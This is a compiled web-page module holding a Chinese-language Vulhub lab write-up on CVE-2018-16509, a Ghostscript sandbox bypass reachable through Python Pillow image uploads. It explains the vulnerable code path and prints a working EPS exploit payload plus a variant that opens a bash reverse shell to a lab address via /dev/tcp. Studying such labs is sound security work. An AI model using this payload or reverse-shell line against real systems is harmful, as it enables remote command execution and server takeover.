import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as s,b as n,d as t,e}from"./app-58e4a7d6.js";const l={},u=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>通过 Ghostscript CVE-2018-16509 执行 Python PIL/Pillow 远程 Shell 命令。</p><p>Ghostscript 是一套基于 Adobe、PostScript 及可移植文档格式（PDF）的页面描述语言等而编译成的免费软件。Ghostscript 常常作为另一个软件（例如 ImageMagick）的依赖项安装在生产服务器中（例如 <code>/usr/local/bin/gs</code>，或 <code>/usr/bin/gs</code>) 。</p><p>CVE-2018-16509 漏洞允许在 v9.24 之前的 Ghostscript 中通过 -dSAFER 实现绕过，通过处理 PostScript 中的失败恢复 (grestore) 来执行任意命令，禁用 LockSafetyParams ，避免无效访问。</p><p>此漏洞存在于 ImageMagick 等库或带有 Ghotscript 的编程语言中的图像库（本例中为 PIL/Pillow）中。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 运行环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>运行后，访问 <code>http://your-ip:8000/</code> 即可看到一个上传页面。</p><h2 id="漏洞分析" tabindex="-1"><a class="header-anchor" href="#漏洞分析" aria-hidden="true">#</a> 漏洞分析</h2>`,10),r={href:"https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2018-16509/rce.jpg",target:"_blank",rel:"noopener noreferrer"},d=s("code",null,"touch /tmp/got_rce",-1),k=s("p",null,[n("通过命令 "),s("code",null,"docker container ls"),n(" 获取容器 ID。")],-1),m=s("p",null,[n("如果想执行其他命令，可以在 rce.jpg 中修改命令 "),s("code",null,"touch /tmp/got_rce"),n(" 为任意其他命令。")],-1),v={href:"https://seclists.org/oss-sec/2018/q3/142",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/python-pillow/Pillow/blob/0adeb82e9886cdedb3917e8ddfaf46f69556a991/src/PIL/EpsImagePlugin.py",target:"_blank",rel:"noopener noreferrer"},b={href:"http://app.py",target:"_blank",rel:"noopener noreferrer"},h=e(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;POST&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">&#39;POST&#39;</span><span class="token punctuation">:</span>
        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;image&#39;</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">&#39;No image found&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>

        filename <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename
        ext <span class="token operator">=</span> path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>ext <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">&#39;.jpg&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;.jpeg&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;.png&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;.gif&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;.bmp&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">&#39;Invalid extension&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>

        tmp <span class="token operator">=</span> tempfile<span class="token punctuation">.</span>mktemp<span class="token punctuation">(</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">)</span>
        img_path <span class="token operator">=</span> <span class="token string">&quot;{}.{}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> ext<span class="token punctuation">)</span>

        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>img_path<span class="token punctuation">)</span>

        img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>img_path<span class="token punctuation">)</span>
        w<span class="token punctuation">,</span> h <span class="token operator">=</span> img<span class="token punctuation">.</span>size
        ratio <span class="token operator">=</span> <span class="token number">256.0</span> <span class="token operator">/</span> <span class="token builtin">max</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> h<span class="token punctuation">)</span>

        resized_img <span class="token operator">=</span> img<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>w <span class="token operator">*</span> ratio<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h <span class="token operator">*</span> ratio<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        resized_img<span class="token punctuation">.</span>save<span class="token punctuation">(</span>img_path<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),_=s("code",null,"img = Image.open(img_path)",-1),f=s("code",null,"%!PS-Adobe-3.0 EPSF-3.0",-1),P={href:"http://EPSImagePlugin.py",target:"_blank",rel:"noopener noreferrer"},y=s("code",null,"_open()",-1),q=s("p",null,[n("为了避免触发错误 "),s("code",null,'raise IOError("cannot determine EPS bounding box")'),n("，文件中将加入边界框信息（例如，"),s("code",null,"%%BoundingBox: -0 -0 100 100"),n("）。")],-1),x={href:"http://EPSImagePlugin.py",target:"_blank",rel:"noopener noreferrer"},w=s("code",null,"Ghostscript",-1),I=s("code",null,"subprocess",-1),E=e(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>    <span class="token comment"># Build Ghostscript command</span>
    command <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;gs&quot;</span><span class="token punctuation">,</span>
               <span class="token string">&quot;-q&quot;</span><span class="token punctuation">,</span>                         <span class="token comment"># quiet mode</span>
               <span class="token string">&quot;-g%dx%d&quot;</span> <span class="token operator">%</span> size<span class="token punctuation">,</span>             <span class="token comment"># set output geometry (pixels)</span>
               <span class="token string">&quot;-r%fx%f&quot;</span> <span class="token operator">%</span> res<span class="token punctuation">,</span>              <span class="token comment"># set input DPI (dots per inch)</span>
               <span class="token string">&quot;-dBATCH&quot;</span><span class="token punctuation">,</span>                    <span class="token comment"># exit after processing</span>
               <span class="token string">&quot;-dNOPAUSE&quot;</span><span class="token punctuation">,</span>                  <span class="token comment"># don&#39;t pause between pages</span>
               <span class="token string">&quot;-dSAFER&quot;</span><span class="token punctuation">,</span>                    <span class="token comment"># safe mode</span>
               <span class="token string">&quot;-sDEVICE=ppmraw&quot;</span><span class="token punctuation">,</span>            <span class="token comment"># ppm driver</span>
               <span class="token string">&quot;-sOutputFile=%s&quot;</span> <span class="token operator">%</span> outfile<span class="token punctuation">,</span>  <span class="token comment"># output file</span>
               <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;%d %d translate&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token operator">-</span>bbox<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span>bbox<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                             <span class="token comment"># adjust for image origin</span>
               <span class="token string">&quot;-f&quot;</span><span class="token punctuation">,</span> infile<span class="token punctuation">,</span>                 <span class="token comment"># input file</span>
               <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;showpage&quot;</span><span class="token punctuation">,</span>             <span class="token comment"># showpage (see: https://bugs.ghostscript.com/show_bug.cgi?id=698272)</span>
               <span class="token punctuation">]</span>


    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>devnull<span class="token punctuation">,</span> <span class="token string">&#39;w+b&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> devnull<span class="token punctuation">:</span>
            startupinfo <span class="token operator">=</span> <span class="token boolean">None</span>
            <span class="token keyword">if</span> sys<span class="token punctuation">.</span>platform<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&#39;win&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                startupinfo <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>STARTUPINFO<span class="token punctuation">(</span><span class="token punctuation">)</span>
                startupinfo<span class="token punctuation">.</span>dwFlags <span class="token operator">|</span><span class="token operator">=</span> subprocess<span class="token punctuation">.</span>STARTF_USESHOWWINDOW
            subprocess<span class="token punctuation">.</span>check_call<span class="token punctuation">(</span>command<span class="token punctuation">,</span> stdin<span class="token operator">=</span>devnull<span class="token punctuation">,</span> stdout<span class="token operator">=</span>devnull<span class="token punctuation">,</span>
                                  startupinfo<span class="token operator">=</span>startupinfo<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),S={href:"http://Image.py",target:"_blank",rel:"noopener noreferrer"},O=s("code",null,"load",-1),F=s("code",null," resize",-1),L=s("code",null,"crop",-1),T=s("code",null,"rotate",-1),V=s("code",null,"save",-1),G=s("code",null,"load",-1),N=e(`<p>结合 Tavis Ormandy 的 POC，我们可以制作 <code>rce.jpg</code>，实现远程 shell 命令执行。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功执行命令 <code>touch /tmp/got_rce</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281659859.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>将 <code>touch /tmp/tmp/got_rce</code> 命令改为反弹 shell 命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>mark /OutputFile (%pipe%bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot;) currentdevice putdeviceprops
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功接收反弹 shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281701913.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,8);function A(B,C){const a=o("ExternalLinkIcon");return c(),i("div",null,[u,s("p",null,[n("可以通过上传 "),s("a",r,[n("rce.jpg"),t(a)]),n(" （一个 EPS 图像，并不是一个真正的 JPG）来在服务器中执行命令 "),d,n("。")]),k,m,s("p",null,[n("可以参考 Tavis Ormandy 在 "),s("a",v,[n("oss-security"),t(a)]),n(" 中对漏洞的解释。")]),s("p",null,[n("可以在 "),s("a",g,[n("EPSImagePlugin.py"),t(a)]),n(" 中查看 PIL/Pillow 中 Ghostscript 的源代码。")]),s("p",null,[n("易受攻击的代码如下，例如 "),s("a",b,[n("app.py"),t(a)]),n("：")]),h,s("p",null,[n("上传文件将通过 "),_,n(" 加载。PIL 将自动检测图片是否为 EPS 图片（例如，文件头为 "),f,n("）。随后，将调用 EpsImageFile 类 "),s("a",P,[n("EPSImagePlugin.py"),t(a)]),n(" 文件中的 "),y,n(" 函数。")]),q,s("p",null,[n("EPS 图像将被 "),s("a",x,[n("EPSImagePlugin.py"),t(a)]),n(" 文件中的 "),w,n(" 函数的 "),I,n(" 进行处理：")]),E,s("p",null,[n("以上代码将在 "),s("a",S,[n("Image.py"),t(a)]),n(" 文件中的 "),O,n(" 被调用的时候才会被调用，所以只打开图片不会触发漏洞。"),F,n("、 "),L,n("、"),T,n("、和 "),V,n(" 函数将会调用 "),G,n(" ，并触发漏洞。")]),N])}const D=p(l,[["render",A],["__file","Python PIL 远程命令执行漏洞 CVE-2018-16509.html.vue"]]);export{D as default};
